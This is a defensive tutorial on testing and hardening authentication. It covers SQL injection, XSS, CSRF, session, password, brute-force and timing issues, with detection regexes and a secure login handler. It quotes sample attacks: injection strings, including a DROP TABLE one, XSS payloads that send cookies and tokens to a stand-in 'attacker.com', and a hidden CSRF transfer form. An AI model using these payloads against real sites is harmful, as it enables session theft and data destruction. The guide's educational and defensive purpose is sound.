# T135: Authentication Penetration Testing - Learning Guide

**Topic**: Automated Security Testing for Authentication Flows
**Level**: Advanced
**Prerequisites**: Understanding of authentication, web security, SQL, and HTTP
**Estimated Time**: 45 minutes

---

## Overview

This guide covers automated penetration testing techniques for authentication systems. Learn how to detect and prevent common security vulnerabilities including SQL injection, XSS, CSRF, session hijacking, and brute force attacks.

---

## Key Concepts

### 1. Penetration Testing

**Definition**: Simulating cyberattacks to identify security vulnerabilities before malicious actors exploit them.

**Phases**:
1. **Reconnaissance**: Identify attack surface and entry points
2. **Scanning**: Probe for vulnerabilities using automated tools
3. **Exploitation**: Attempt to exploit discovered vulnerabilities
4. **Reporting**: Document findings and remediation steps

**Automated vs Manual**:
- Automated: Fast, consistent, repeatable (this implementation)
- Manual: Creative, context-aware, finds complex vulnerabilities
- Best Practice: Combine both approaches

---

### 2. SQL Injection

**Attack**: Injecting malicious SQL code into user inputs to manipulate database queries.

**Example Attack**:
```sql
-- Normal query
SELECT * FROM users WHERE email = 'user@example.com'

-- Injected input: admin'--
SELECT * FROM users WHERE email = 'admin'--'
-- The -- comments out the rest, bypassing password check
```

**Common Patterns**:
- `' OR '1'='1` - Always true condition
- `' UNION SELECT` - Combine queries to extract data
- `'; DROP TABLE` - Destructive commands
- `'; WAITFOR DELAY` - Time-based detection

**Detection**:
```typescript
// Check for SQL keywords and special characters
/(\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION)\b)/i
/('|"|;|--|\*|\/\*)/
/(OR|AND)\s+['"]?\d+['"]?\s*=\s*['"]?\d+['"]?/i
```

**Prevention**:
- ✅ Use parameterized queries (prepared statements)
- ✅ Use ORMs (Drizzle, Prisma) that escape inputs
- ✅ Validate and sanitize all user inputs
- ✅ Use principle of least privilege for database accounts
- ❌ Never concatenate user input into SQL queries

---

### 3. Cross-Site Scripting (XSS)

**Attack**: Injecting malicious JavaScript into web pages viewed by other users.

**Types**:
1. **Stored XSS**: Malicious script saved in database
2. **Reflected XSS**: Script in URL parameters reflected back
3. **DOM-based XSS**: Client-side script manipulation

**Example Attack**:
```html
<!-- Injected comment -->
<script>
  // Steal session cookie
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

<!-- Image with event handler -->
<img src=x onerror="alert('XSS')">

<!-- SVG with onload -->
<svg/onload="fetch('https://attacker.com/steal?data=' + localStorage.token)">
```

**Detection Patterns**:
```typescript
/<script[\s\S]*?>[\s\S]*?<\/script>/i  // Script tags
/<img[\s\S]*?onerror[\s\S]*?>/i        // Event handlers
/javascript:/i                          // JavaScript protocol
/on\w+\s*=[\s\S]*?/i                   // Any event handler
```

**Prevention**:
- ✅ Escape all user-generated content
- ✅ Use Content Security Policy (CSP) headers
- ✅ Sanitize HTML inputs (DOMPurify, sanitize-html)
- ✅ Set HttpOnly flag on session cookies
- ❌ Never insert untrusted data into HTML context

---

### 4. Cross-Site Request Forgery (CSRF)

**Attack**: Tricking users into submitting malicious requests while authenticated.

**Example Attack**:
```html
<!-- Malicious website -->
<img src="https://bank.com/transfer?to=attacker&amount=1000">
<!-- If user is logged into bank.com, this executes -->

<!-- Or hidden form -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
```

**CSRF Token Requirements**:
- Length: ≥32 characters (128+ bits)
- Entropy: Cryptographically random
- Scope: Unique per session or per request
- Validation: Server-side verification required
- Storage: Not in cookies (use form fields, headers)

**Prevention**:
```typescript
// Generate secure token
const csrfToken = crypto.randomBytes(32).toString('hex');

// Validate token
function validateCSRF(token: string): boolean {
  return token.length >= 32 &&
         /^[a-zA-Z0-9]+$/.test(token) &&
         hasHighEntropy(token);
}
```

**Additional Protections**:
- ✅ SameSite cookie attribute (Strict or Lax)
- ✅ Verify Origin/Referer headers
- ✅ Require re-authentication for sensitive actions
- ✅ Use custom headers for AJAX requests

---

### 5. Session Security

**Session Hijacking**: Stealing or predicting session tokens to impersonate users.

**Attack Vectors**:
- Session fixation: Force known session ID
- Session prediction: Guess sequential tokens
- Session sniffing: Intercept unencrypted tokens
- XSS: Steal tokens via JavaScript

**Secure Session Requirements**:
```typescript
// Good: Cryptographically random
const sessionId = crypto.randomUUID(); // or crypto.randomBytes(32)

// Bad: Predictable
const sessionId = Date.now().toString(); // Sequential
const sessionId = userId + '_' + timestamp; // Guessable
```

**Cookie Security Flags**:
```typescript
const secureCookie = {
  secure: true,           // HTTPS only
  httpOnly: true,         // No JavaScript access
  sameSite: 'strict',     // CSRF protection
  maxAge: 86400,          // 24 hour expiration
  path: '/',
  domain: '.example.com'
};
```

**Session Management Best Practices**:
- ✅ Generate new session ID after login
- ✅ Invalidate session on logout
- ✅ Implement session timeout (idle + absolute)
- ✅ Regenerate session ID periodically
- ✅ Store session data server-side (not in JWT)

---

### 6. Password Security

**Weak Password Risks**:
- Brute force attacks
- Dictionary attacks
- Credential stuffing
- Rainbow table attacks

**Password Strength Requirements**:
```typescript
interface PasswordPolicy {
  minLength: 12,           // Minimum 12 characters
  requireUppercase: true,  // At least one uppercase
  requireLowercase: true,  // At least one lowercase
  requireNumbers: true,    // At least one digit
  requireSpecialChars: true, // At least one special char
  preventCommon: true,     // Block common passwords
  preventUserInfo: true    // Block username, email
}
```

**Password Strength Scoring**:
```typescript
function calculateScore(password: string): number {
  let score = 0;
  if (password.length >= 8) score += 20;
  if (password.length >= 12) score += 10;
  if (password.length >= 16) score += 10;
  if (/[A-Z]/.test(password)) score += 15;
  if (/[a-z]/.test(password)) score += 15;
  if (/\d/.test(password)) score += 15;
  if (/[^A-Za-z0-9]/.test(password)) score += 15;
  if (isCommonPassword(password)) score -= 70;
  return Math.max(0, Math.min(100, score));
}
```

**Storage Best Practices**:
- ✅ Use bcrypt, Argon2, or scrypt
- ✅ Add salt (unique per password)
- ✅ Set high work factor (cost parameter)
- ❌ Never store plaintext passwords
- ❌ Don't use MD5, SHA1, or simple SHA256

---

### 7. Brute Force Protection

**Attack**: Systematically trying many passwords to guess correct one.

**Rate Limiting Implementation**:
```typescript
// Strict rate limit on authentication endpoints
const authRateLimit = {
  maxRequests: 5,        // Allow 5 attempts
  windowSeconds: 900,    // Per 15 minutes
  blockDuration: 3600    // Block for 1 hour after limit
};
```

**Progressive Delays**:
```typescript
function getDelay(attemptCount: number): number {
  // Exponential backoff
  return Math.min(60000, Math.pow(2, attemptCount) * 1000);
  // 1s, 2s, 4s, 8s, 16s, 32s, 60s max
}
```

**Account Lockout**:
- Temporary lockout after N failed attempts
- CAPTCHA after M attempts
- Email notification on suspicious activity
- Admin notification for repeated lockouts

---

### 8. Timing Attacks

**Attack**: Measuring response times to infer information about system state.

**Username Enumeration**:
```typescript
// Vulnerable: Different timing for valid vs invalid users
async function login(email: string, password: string) {
  const user = await db.findUser(email);
  if (!user) return { error: 'Invalid credentials' }; // Fast

  const valid = await bcrypt.compare(password, user.hash);
  if (!valid) return { error: 'Invalid credentials' }; // Slow

  return { success: true };
}
```

**Constant-Time Fix**:
```typescript
// Fixed: Same timing regardless of user existence
async function login(email: string, password: string) {
  const user = await db.findUser(email);
  const hash = user?.hash || '$2b$10$dummyhashfornonexistentuser';

  const valid = await bcrypt.compare(password, hash);

  if (!user || !valid) {
    return { error: 'Invalid credentials' };
  }

  return { success: true };
}
```

**Detection**:
```typescript
function analyzeTimingAttack(
  validUserTimes: number[],
  invalidUserTimes: number[]
): { vulnerable: boolean; difference: number } {
  const avgValid = average(validUserTimes);
  const avgInvalid = average(invalidUserTimes);
  const difference = Math.abs(avgValid - avgInvalid);

  return {
    vulnerable: difference > 100, // >100ms significant
    difference
  };
}
```

---

## Using the Pentest Framework

### Basic Usage

```typescript
import {
  containsSQLInjection,
  containsXSS,
  testPasswordStrength,
  testCookieSecurity,
  testCSRFToken
} from '@/lib/security/pentest';

// 1. Validate user input
function validateInput(input: string): boolean {
  if (containsSQLInjection(input)) {
    console.error('SQL injection attempt detected');
    return false;
  }

  if (containsXSS(input)) {
    console.error('XSS attempt detected');
    return false;
  }

  return true;
}

// 2. Check password strength
function validatePassword(password: string): boolean {
  const result = testPasswordStrength(password);

  if (result.isCommon) {
    throw new Error('Password is too common');
  }

  if (result.score < 60) {
    throw new Error(`Password is too weak (score: ${result.score}/100)`);
  }

  return true;
}

// 3. Validate CSRF token
function validateCSRF(token: string | null): boolean {
  const result = testCSRFToken(token);

  if (!result.isSecure) {
    console.error('CSRF vulnerabilities:', result.vulnerabilities);
    return false;
  }

  return true;
}

// 4. Check cookie security
function validateCookieSettings(cookie: CookieOptions): boolean {
  const result = testCookieSecurity(cookie);

  if (!result.isSecure) {
    console.warn('Cookie vulnerabilities:', result.vulnerabilities);
    return false;
  }

  return true;
}
```

### Running Tests

```bash
# Run pentest suite
npm test tests/security/T135_authentication_pentest.test.ts

# Run with coverage
npm run test:coverage -- tests/security/T135_authentication_pentest.test.ts

# Run specific test suite
npm test -- -t "SQL Injection Detection"
```

---

## Real-World Example

### Secure Login Implementation

```typescript
import { containsSQLInjection, containsXSS } from '@/lib/security/pentest';
import { checkRateLimit } from '@/lib/ratelimit';
import { redis } from '@/lib/redis';

export async function loginHandler(request: Request) {
  const { email, password, csrfToken } = await request.json();

  // 1. Validate CSRF token
  if (!validateCSRF(csrfToken)) {
    return Response.json({ error: 'Invalid CSRF token' }, { status: 403 });
  }

  // 2. Check rate limit (5 attempts per 15 minutes)
  const rateLimitKey = `login:${getClientIP(request)}`;
  const rateLimit = await checkRateLimit(rateLimitKey, 5, 900);

  if (!rateLimit.allowed) {
    return Response.json({
      error: 'Too many login attempts. Try again later.'
    }, { status: 429 });
  }

  // 3. Validate input for SQL injection and XSS
  if (containsSQLInjection(email) || containsXSS(email)) {
    await logSecurityEvent('sql_injection_attempt', { email });
    return Response.json({ error: 'Invalid input' }, { status: 400 });
  }

  // 4. Constant-time lookup and comparison
  const user = await db.findUserByEmail(email);
  const hash = user?.passwordHash || '$2b$10$dummyhashfornonexistentuser';

  const validPassword = await bcrypt.compare(password, hash);

  if (!user || !validPassword) {
    // Increment failed attempt counter
    await redis.incr(`login_failed:${email}`);
    return Response.json({
      error: 'Invalid credentials'
    }, { status: 401 });
  }

  // 5. Check account lockout
  const failedAttempts = await redis.get(`login_failed:${email}`);
  if (failedAttempts && parseInt(failedAttempts) >= 5) {
    return Response.json({
      error: 'Account temporarily locked'
    }, { status: 403 });
  }

  // 6. Create secure session
  const sessionId = crypto.randomUUID();
  await redis.set(`session:${sessionId}`, user.id, { ex: 86400 });

  // 7. Clear failed attempts
  await redis.del(`login_failed:${email}`);

  // 8. Set secure cookie
  return Response.json({ success: true }, {
    headers: {
      'Set-Cookie': `session_id=${sessionId}; ` +
                    'Secure; HttpOnly; SameSite=Strict; ' +
                    'Path=/; Max-Age=86400'
    }
  });
}
```

---

## Common Vulnerabilities Checklist

### Authentication
- [ ] SQL injection in login form
- [ ] XSS in username/email display
- [ ] Brute force attempts
- [ ] Weak password policy
- [ ] No rate limiting
- [ ] Username enumeration via timing
- [ ] Missing CSRF protection
- [ ] Session fixation
- [ ] Insecure session storage

### Session Management
- [ ] Predictable session IDs
- [ ] Session not invalidated on logout
- [ ] No session timeout
- [ ] Session cookie missing Secure flag
- [ ] Session cookie missing HttpOnly flag
- [ ] Session cookie missing SameSite attribute
- [ ] Session data in JWT without validation

### Input Validation
- [ ] No SQL injection prevention
- [ ] No XSS sanitization
- [ ] No CSRF token validation
- [ ] No length limits
- [ ] No content-type validation
- [ ] Trust client-side validation only

---

## Resources

### OWASP Top 10 (2021)
1. Broken Access Control
2. Cryptographic Failures
3. Injection
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable and Outdated Components
7. Identification and Authentication Failures
8. Software and Data Integrity Failures
9. Security Logging and Monitoring Failures
10. Server-Side Request Forgery (SSRF)

### Tools
- **OWASP ZAP**: Web application security scanner
- **Burp Suite**: Security testing platform
- **SQLMap**: Automated SQL injection tool
- **npm audit**: Dependency vulnerability scanner
- **Snyk**: Continuous security monitoring

### Further Reading
- OWASP Testing Guide
- OWASP Cheat Sheet Series
- NIST Digital Identity Guidelines (SP 800-63B)
- CWE Top 25 Most Dangerous Software Weaknesses

---

## Summary

Automated penetration testing helps identify security vulnerabilities early. This framework provides:

✅ Detection for 5+ major vulnerability categories
✅ 60+ automated test cases
✅ Real-time input validation
✅ Password strength analysis
✅ Session security testing
✅ CSRF token validation
✅ Comprehensive reporting

**Best Practice**: Integrate security testing into every stage of development, from pre-commit hooks to production monitoring.
